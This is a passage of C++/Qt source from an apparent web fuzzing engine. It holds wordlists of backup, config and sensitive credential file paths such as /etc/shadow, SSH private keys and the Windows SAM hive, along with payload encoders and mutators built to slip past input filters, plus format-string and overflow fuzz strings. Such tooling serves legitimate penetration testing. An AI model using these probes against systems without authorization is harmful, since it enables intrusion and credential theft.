        QStringLiteral("service"), QStringLiteral("api"), QStringLiteral("jenkins"),
        QStringLiteral("git"), QStringLiteral("svn"), QStringLiteral("deploy"),
    };
}

QStringList FuzzEngine::getFileExtensions() {
    return {
        QStringLiteral(".php"), QStringLiteral(".asp"), QStringLiteral(".aspx"),
        QStringLiteral(".jsp"), QStringLiteral(".jspx"), QStringLiteral(".cfm"),
        QStringLiteral(".cgi"), QStringLiteral(".pl"), QStringLiteral(".py"),
        QStringLiteral(".rb"), QStringLiteral(".do"), QStringLiteral(".action"),
        QStringLiteral(".html"), QStringLiteral(".htm"), QStringLiteral(".shtml"),
        QStringLiteral(".xml"), QStringLiteral(".json"), QStringLiteral(".txt"),
        QStringLiteral(".bak"), QStringLiteral(".old"), QStringLiteral(".orig"),
        QStringLiteral(".tmp"), QStringLiteral(".temp"), QStringLiteral(".swp"),
        QStringLiteral(".inc"), QStringLiteral(".conf"), QStringLiteral(".config"),
        QStringLiteral(".sql"), QStringLiteral(".log"), QStringLiteral(".zip"),
        QStringLiteral(".tar"), QStringLiteral(".tar.gz"), QStringLiteral(".gz"),
    };
}

QStringList FuzzEngine::getBackupExtensions() {
    return {
        QStringLiteral(".bak"), QStringLiteral(".backup"), QStringLiteral(".old"),
        QStringLiteral(".orig"), QStringLiteral(".original"), QStringLiteral(".save"),
        QStringLiteral(".saved"), QStringLiteral(".copy"), QStringLiteral(".tmp"),
        QStringLiteral(".temp"), QStringLiteral(".swp"), QStringLiteral(".swo"),
        QStringLiteral("~"), QStringLiteral(".1"), QStringLiteral(".2"),
        QStringLiteral("_backup"), QStringLiteral("-backup"), QStringLiteral("_old"),
        QStringLiteral("-old"), QStringLiteral("_bak"), QStringLiteral("-bak"),
        QStringLiteral(".000"), QStringLiteral(".001"), QStringLiteral("_copy"),
        QStringLiteral("-copy"), QStringLiteral(".dist"), QStringLiteral(".default"),
        QStringLiteral(".sample"), QStringLiteral(".example"), QStringLiteral(".new"),
    };
}

QStringList FuzzEngine::getConfigFiles() {
    return {
        QStringLiteral("web.config"), QStringLiteral(".htaccess"), QStringLiteral(".htpasswd"),
        QStringLiteral("php.ini"), QStringLiteral("config.php"), QStringLiteral("configuration.php"),
        QStringLiteral("wp-config.php"), QStringLiteral("settings.php"), QStringLiteral("database.yml"),
        QStringLiteral("config.yml"), QStringLiteral("config.yaml"), QStringLiteral("application.yml"),
        QStringLiteral("application.properties"), QStringLiteral("settings.py"), QStringLiteral("local_settings.py"),
        QStringLiteral(".env"), QStringLiteral(".env.local"), QStringLiteral(".env.production"),
        QStringLiteral(".env.development"), QStringLiteral("env.js"), QStringLiteral("config.js"),
        QStringLiteral("server.xml"), QStringLiteral("tomcat-users.xml"), QStringLiteral("context.xml"),
        QStringLiteral("web.xml"), QStringLiteral("struts.xml"), QStringLiteral("applicationContext.xml"),
        QStringLiteral("beans.xml"), QStringLiteral("persistence.xml"), QStringLiteral("hibernate.cfg.xml"),
        QStringLiteral("log4j.properties"), QStringLiteral("log4j.xml"), QStringLiteral("log4j2.xml"),
        QStringLiteral("nginx.conf"), QStringLiteral("httpd.conf"), QStringLiteral("apache2.conf"),
        QStringLiteral("my.cnf"), QStringLiteral("my.ini"), QStringLiteral("postgresql.conf"),
        QStringLiteral("redis.conf"), QStringLiteral("mongod.conf"), QStringLiteral("elasticsearch.yml"),
    };
}

QStringList FuzzEngine::getSensitiveFiles() {
    return {
        QStringLiteral("/etc/passwd"), QStringLiteral("/etc/shadow"), QStringLiteral("/etc/hosts"),
        QStringLiteral("/etc/group"), QStringLiteral("/etc/sudoers"), QStringLiteral("/etc/ssh/sshd_config"),
        QStringLiteral("/proc/self/environ"), QStringLiteral("/proc/self/cmdline"), QStringLiteral("/proc/version"),
        QStringLiteral("/var/log/apache2/access.log"), QStringLiteral("/var/log/apache2/error.log"),
        QStringLiteral("/var/log/nginx/access.log"), QStringLiteral("/var/log/nginx/error.log"),
        QStringLiteral("/var/log/auth.log"), QStringLiteral("/var/log/syslog"), QStringLiteral("/var/log/messages"),
        QStringLiteral("~/.ssh/id_rsa"), QStringLiteral("~/.ssh/id_dsa"), QStringLiteral("~/.ssh/authorized_keys"),
        QStringLiteral("~/.bash_history"), QStringLiteral("~/.mysql_history"), QStringLiteral("~/.psql_history"),
        QStringLiteral("C:\\Windows\\System32\\config\\SAM"), QStringLiteral("C:\\Windows\\System32\\config\\SYSTEM"),
        QStringLiteral("C:\\Windows\\win.ini"), QStringLiteral("C:\\Windows\\system.ini"),
        QStringLiteral("C:\\boot.ini"), QStringLiteral("C:\\inetpub\\wwwroot\\web.config"),
        QStringLiteral(".git/config"), QStringLiteral(".git/HEAD"), QStringLiteral(".svn/entries"),
        QStringLiteral("robots.txt"), QStringLiteral("sitemap.xml"), QStringLiteral("crossdomain.xml"),
        QStringLiteral("clientaccesspolicy.xml"), QStringLiteral("security.txt"), QStringLiteral(".well-known/security.txt"),
    };
}

QString FuzzEngine::encodePayload(const QString &payload, const QString &encoding) {
    if (encoding == QStringLiteral("url")) return urlEncode(payload);
    if (encoding == QStringLiteral("double")) return doubleEncode(payload);
    if (encoding == QStringLiteral("unicode")) return unicodeEncode(payload);
    if (encoding == QStringLiteral("hex")) return hexEncode(payload);
    if (encoding == QStringLiteral("base64")) return base64Encode(payload);
    return payload;
}

QString FuzzEngine::doubleEncode(const QString &payload) {
    return urlEncode(urlEncode(payload));
}

QString FuzzEngine::unicodeEncode(const QString &payload) {
    QString result;
    for (const QChar &c : payload) {
        result += QString(QStringLiteral("\\u%1")).arg(c.unicode(), 4, 16, QChar('0'));
    }
    return result;
}

QString FuzzEngine::hexEncode(const QString &payload) {
    QString result;
    QByteArray bytes = payload.toUtf8();
    for (char c : bytes) {
        result += QString(QStringLiteral("\\x%1")).arg(static_cast<unsigned char>(c), 2, 16, QChar('0'));
    }
    return result;
}

QString FuzzEngine::base64Encode(const QString &payload) {
    return QString::fromLatin1(payload.toUtf8().toBase64());
}

QString FuzzEngine::urlEncode(const QString &payload) {
    return QString::fromUtf8(QUrl::toPercentEncoding(payload));
}

QStringList FuzzEngine::mutatePayload(const QString &payload) {
    QStringList mutations;
    mutations << payload;
    mutations << payload.toUpper();
    mutations << payload.toLower();
    mutations << urlEncode(payload);
    mutations << doubleEncode(payload);
    mutations << base64Encode(payload);

    QString spaced = payload;
    spaced.replace(QStringLiteral(" "), QStringLiteral("/**/"));
    mutations << spaced;

    QString tabbed = payload;
    tabbed.replace(QStringLiteral(" "), QStringLiteral("\t"));
    mutations << tabbed;

    QString newlined = payload;
    newlined.replace(QStringLiteral(" "), QStringLiteral("\n"));
    mutations << newlined;

    return mutations;
}

QStringList FuzzEngine::generateFuzzStrings(int count) {
    QStringList strings;

    strings << QString(256, QChar('A'));
    strings << QString(1024, QChar('A'));
    strings << QString(4096, QChar('A'));
    strings << QString(65536, QChar('A'));

    strings << QStringLiteral("%n%n%n%n");
    strings << QStringLiteral("%s%s%s%s");
    strings << QStringLiteral("%x%x%x%x");
    strings << QStringLiteral("%p%p%p%p");

    strings << QStringLiteral("-1");
    strings << QStringLiteral("0");
    strings << QStringLiteral("1");
    strings << QStringLiteral("2147483647");
    strings << QStringLiteral("2147483648");
    strings << QStringLiteral("-2147483648");
    strings << QStringLiteral("-2147483649");
    strings << QStringLiteral("4294967295");
    strings << QStringLiteral("4294967296");
    strings << QStringLiteral("9223372036854775807");
    strings << QStringLiteral("9223372036854775808");

    strings << QStringLiteral("0.0");
    strings << QStringLiteral("-0.0");
    strings << QStringLiteral("1.0e308");
    strings << QStringLiteral("1.0e-308");
    strings << QStringLiteral("NaN");
    strings << QStringLiteral("Infinity");
    strings << QStringLiteral("-Infinity");

    strings << QString();
    strings << QStringLiteral(" ");
    strings << QStringLiteral("\t");
    strings << QStringLiteral("\n");
    strings << QStringLiteral("\r");
    strings << QStringLiteral("\r\n");
    strings << QStringLiteral("\0");

    while (strings.size() < count) {
        strings << QStringLiteral("FUZZ") + QString::number(strings.size());
    }

    return strings.mid(0, count);
}

QByteArray FuzzEngine::generateRandomBytes(int length) {
    QByteArray result;
    result.resize(length);
    for (int i = 0; i < length; ++i) {
        result[i] = static_cast<char>(QRandomGenerator::global()->bounded(256));
    }
    return result;
}
